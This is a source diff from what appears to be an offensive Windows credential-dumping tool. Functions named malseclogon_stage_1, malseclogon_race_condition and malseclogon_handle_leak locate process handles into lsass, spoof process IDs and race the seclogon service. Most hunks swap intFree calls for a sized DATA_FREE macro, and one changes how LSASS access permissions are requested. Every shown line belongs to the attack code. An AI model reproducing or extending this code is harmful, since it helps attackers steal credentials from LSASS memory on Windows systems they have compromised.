@@ -187,7 +187,7 @@ BOOL malseclogon_handle_leak(
         if (created_processes)
         {
             kill_created_processes(created_processes);
-            intFree(created_processes); created_processes = NULL;
+            DATA_FREE(created_processes, sizeof(PROCESS_LIST));
             if (Pcreated_processes)
                 *Pcreated_processes = NULL;
         }
@@ -299,7 +299,7 @@ BOOL malseclogon_stage_1(
 
     success = find_process_handles_in_process(
         lsass_pid,
-        LSASS_DEFAULT_PERMISSIONS,
+        get_lsass_min_permissions(),
         &handle_list);
     if (!success)
         goto cleanup;
@@ -416,9 +416,13 @@ BOOL malseclogon_stage_1(
 
 cleanup:
     if (synchronization_file)
-        intFree(synchronization_file);
+    {
+        DATA_FREE(synchronization_file, wcslen(synchronization_file) * sizeof(WCHAR));
+    }
     if (handle_list)
-        intFree(handle_list);
+    {
+        DATA_FREE(handle_list, sizeof(HANDLE_LIST));
+    }
     if (original_pid)
         change_pid(original_pid, NULL);
 
@@ -549,7 +553,9 @@ VOID malseclogon_trigger_lock(
 
 end:
     if (handle_list)
-        intFree(handle_list);
+    {
+        DATA_FREE(handle_list, sizeof(HANDLE_LIST));
+    }
 
 
     // since the thread is already finishing, no need to restore our PID
@@ -777,7 +783,7 @@ DWORD get_pid_using_file_path(
         if (NT_SUCCESS(status))
             break;
 
-        intFree(pfpiufi); pfpiufi = NULL;
+        DATA_FREE(pfpiufi, pfpiufiLen);
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
     if (!NT_SUCCESS(status))
     {
@@ -794,7 +800,9 @@ end:
     if (hFile)
         NtClose(hFile);
     if (pfpiufi)
-        intFree(pfpiufi);
+    {
+        DATA_FREE(pfpiufi, pfpiufiLen);
+    }
 
     return pid;
 }
@@ -967,7 +975,9 @@ HANDLE malseclogon_race_condition(
 
 end:
     if (handle_list)
-        intFree(handle_list);
+    {
+        DATA_FREE(handle_list, sizeof(HANDLE_LIST));
+    }
     if (hSeclogon)
         NtClose(hSeclogon);
     if (hDupedHandle)
